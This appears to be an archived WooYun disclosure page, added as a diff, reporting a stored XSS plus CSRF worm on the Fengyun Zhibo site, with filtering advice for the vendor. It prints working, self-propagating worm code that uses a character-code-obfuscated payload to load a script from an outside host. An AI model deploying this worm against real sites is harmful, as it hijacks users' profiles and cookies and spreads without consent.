@@ -1,0 +1,288 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		风云直播利用某xss可以形成蠕虫的例子  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		风云直播利用某xss可以形成蠕虫的例子  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/无尘">无尘</a> 
+</li><li>提交时间：		2013-12-02 13:15</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-02：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-12-07：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">利用站内的XSS漏洞，结合站内信CSRF进行蠕虫式传播。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">此方法特点：<br />
+<br />
+1、可XSS+CSRF形成持久蠕虫，可通过编码强制修改用户操作。因modify.html被影响，所以可拦截被感染用户操作。<br />
+<br />
+2、盗用cookie，钓用户，直接偷金矿，甚至可以形成定向攻击。比如通过<br />
+<br />
+http://gm.fengyunzhibo.com/gamble/ 找到需要黑的土豪。（尽快隐蔽起来吧）<br />
+<br />
+3、引用外部JS文件，让所有操作都成为可能。<br />
+<br />
+通过个人信息中XSS，配合修改个人资料的CSRF可编码蠕虫。因站内类似问题较多，可利用多种方式组合实现蠕虫功能。 （当前触发测试的仅在用户信息页面）<br />
+<br />
+4、不可小视，形成一定的量后，挂广告应该是笔不错的收益。<br />
+<br />
+<br />
+<br />
+简单说下原理流程：<br />
+<br />
+1、通过个人信息的头像字段进行XSS。http://user.fengyunzhibo.com/modify.htm 我的例子中没有做太多的兼容，有心的话可以不同输出页面的兼容，让用户无法发掘被植入了非安全代码。请求原型：<br />
+<br />
+</p><pre><code>$.ajax({<br />
+		url:&quot;http://user.fengyunzhibo.com/usermanager&quot;,<br />
+		type:&quot;post&quot;,<br />
+		data:{<br />
+			op:&quot;uname&quot;,<br />
+			id:&quot;1419428&quot;,<br />
+			data:&quot;{uname:&#039;无尘_xx&#039;,figureurl:&#039;http://www.soso.com/soso/images/logo_index.png\&quot; id=user-avatar /&gt;&lt;img src=a onerror=$(this).hide().attr(\&quot;id\&quot;,\&quot;xyz\&quot;);alert(String.fromCharCode(104,116,116,112,58,47,47,98,108,111,103,46,115,101,108,97,110,103,115,104,105,119,111,46,99,111,109)) a=\&quot;&#039;,location:&#039;北京 东城&#039;,signature:&#039;helloKitty&#039;,gender:&#039;1&#039;}&quot;<br />
+		}<br />
+	});</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+为了不对原始输出造成可察觉影响，其中补完了原始URL地址后，后面用&lt;img &gt;的onerror触发脚本。（兼容代码）<br />
+<br />
+2、这里是高潮，为了解决跨域问题，满足触发条件后，隐藏打开iframe跳转至被感染user.fengyunzhibo.com域下的页面，通过modify.htm页面获取待被感染用户的信息，构建请求完成感染。以下仅实现了部分功能，作为样例。<br />
+<br />
+</p><pre><code>(function(){<br />
+	/*cookie辅助*/<br />
+	$.cookie = function(n,v){<br />
+		var c = document.cookie ;<br />
+		if(n&amp;&amp;!v){<br />
+			var cs = c.indexOf(n+&quot;=&quot;);<br />
+			if(cs!=-1){<br />
+				cs += n.length + 1;<br />
+				ce = c.indexOf(&quot;;&quot;,cs);<br />
+				if(ce==-1)<br />
+					ce=c.length;<br />
+				return unescape(c.substring(cs,ce));<br />
+			}<br />
+			return null ;<br />
+		}<br />
+		<br />
+		if(n&amp;&amp;v){<br />
+			document.cookie=n+&quot;=&quot;+escape(v) ;<br />
+		}<br />
+	};<br />
+	<br />
+	if($.cookie(&quot;u&quot;)){<br />
+		if($(&quot;#w_uinfo&quot;)[0]==undefined){<br />
+			$(&quot;body&quot;).append(&quot;&lt;iframe id=&#039;w_uinfo&#039; style=&#039;display:none&#039;&gt;&lt;/iframe&gt;&quot;);<br />
+			$(&quot;#w_uinfo&quot;).load(function(){<br />
+				//发送请求前,需要检查url是否已被利用,不重复发起.<br />
+				var uInfoFrame = $(&quot;#w_uinfo&quot;).contents() ;<br />
+				//console.log(uInfoFrame.find(&quot;#uname-input&quot;).val().trim());<br />
+				//console.log(uInfoFrame.find(&quot;#def&quot;).attr(&quot;src&quot;));<br />
+				//console.log(uInfoFrame.find(&#039;input[name=&quot;sex&quot;]:checked&#039;).val());<br />
+				//console.log(uInfoFrame.find(&quot;#ddlProvince&quot;).val()+&quot; &quot;+uInfoFrame.find(&quot;#ddlCity&quot;).val());<br />
+				//console.log(uInfoFrame.find(&quot;.signature-input&quot;).text());<br />
+				<br />
+				$.ajax({<br />
+					url:&quot;http://user.fengyunzhibo.com/usermanager&quot;,<br />
+					type:&quot;post&quot;,<br />
+					data:{<br />
+						op:&quot;uname&quot;,<br />
+						id:$.cookie(&quot;u&quot;),<br />
+						data:&quot;{&#039;uname&#039;:&#039;&quot;+uInfoFrame.find(&quot;#uname-input&quot;).val().trim()+&quot;&#039;,&quot;<br />
+								+&quot;&#039;figureurl&#039;:&#039;&quot;+uInfoFrame.find(&quot;#def&quot;).attr(&quot;src&quot;)+&quot;&quot;<br />
+								+&quot;\&quot; id=user-avatar /&gt;&lt;img src=a onerror=$(this).hide().attr(\&quot;id\&quot;,\&quot;xyz\&quot;);window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,119,119,119,46,115,101,108,97,110,103,115,104,105,119,111,46,99,111,109,47,97,100,47,97,100,95,121,117,110,103,102,101,110,103,122,104,105,98,111,46,106,115);document.body.appendChild(window.s) a=\&quot;&quot;<br />
+								+&quot;&#039;,&quot;<br />
+								+&quot;&#039;location&#039;:&#039;&quot;+uInfoFrame.find(&quot;#ddlProvince&quot;).val()+&quot; &quot;+uInfoFrame.find(&quot;#ddlCity&quot;).val()+&quot;&#039;,&quot;<br />
+								+&quot;&#039;signature&#039;:&#039;&quot;+uInfoFrame.find(&quot;.signature-input&quot;).text()+&quot;&#039;,&#039;gender&#039;:&#039;&quot;+uInfoFrame.find(&#039;input[name=&quot;sex&quot;]:checked&#039;).val()+&quot;&#039;}&quot;<br />
+					},<br />
+					success:function(r){<br />
+						if(r == &quot;ok&quot;){<br />
+							alert(&quot;感染成功&quot;);<br />
+							$.cookie(&quot;xyz&quot;+$.cookie(&quot;u&quot;):&quot;822696&quot;);<br />
+						}<br />
+					}<br />
+				});<br />
+			});<br />
+			$(&quot;#w_uinfo&quot;).attr(&quot;src&quot;,&quot;http://user.fengyunzhibo.com/modify.htm&quot;);<br />
+		}<br />
+	}<br />
+})();</code></pre><p class='detail'><br />
+<br />
+3、感染后，可通过远程脚本构建其他功能。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">以下截图用于证明脚本正常触发，具体功能参照详细描述。<br />
+<br />
+<br />
+<br />
+信息卡页面：<br />
+<br />
+http://user.fengyunzhibo.com/home.htm?uid=1419428<br />
+<br />
+</p><p class="detail"><a href="../images/021042430a0635bca244813044ce9d92d7799b8c.png" target="_blank"><img src="../images/021042430a0635bca244813044ce9d92d7799b8c.png" alt="QQ截图20131202104023.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+个人信息修改页面：<br />
+<br />
+http://user.fengyunzhibo.com/modify.htm<br />
+<br />
+</p><p class="detail"><a href="../images/021042562bf254f08b9861002eba47e14b2e7759.png" target="_blank"><img src="../images/021042562bf254f08b9861002eba47e14b2e7759.png" alt="QQ截图20131202104158.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">最简单的方法，在录入用户信息时，增加过滤。<br />
+<br />
+<br />
+<br />
+最妥当的方法，录入信息增加过滤后，对所有输出内容进行二次过滤。<br />
+<br />
+另外查找站内其他的CSRF，进行修改，我记得之前跟你们发了一个邮件，是关于抽奖的CSRF的。<br />
+<br />
+http://forum.fengyunzhibo.com:9002/forum.php?mod=viewthread&amp;tid=1807&amp;extra=<br />
+<br />
+这种问题虽然表面影响不大，但会在特殊情况下造成很严重的问题。如果我的蠕虫里带有自动抽奖的脚本，后果你懂的。<br />
+<br />
+<br />
+<br />
+因为是你们节目的老星际粉，技术问题全力支持，可直接联系我。<br />
+<br />
+联系方式：曾经给 249398279@QQ.com 发过一封邮件关于抽奖的，标题《抽奖的CSRF BUG》，时间 2013年10月14日(星期一) 上午9:16 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/无尘" title="无尘">无尘</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-044666" title="风云直播利用某xss可以形成蠕虫的例子">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-12-02 13:15</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="44666";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
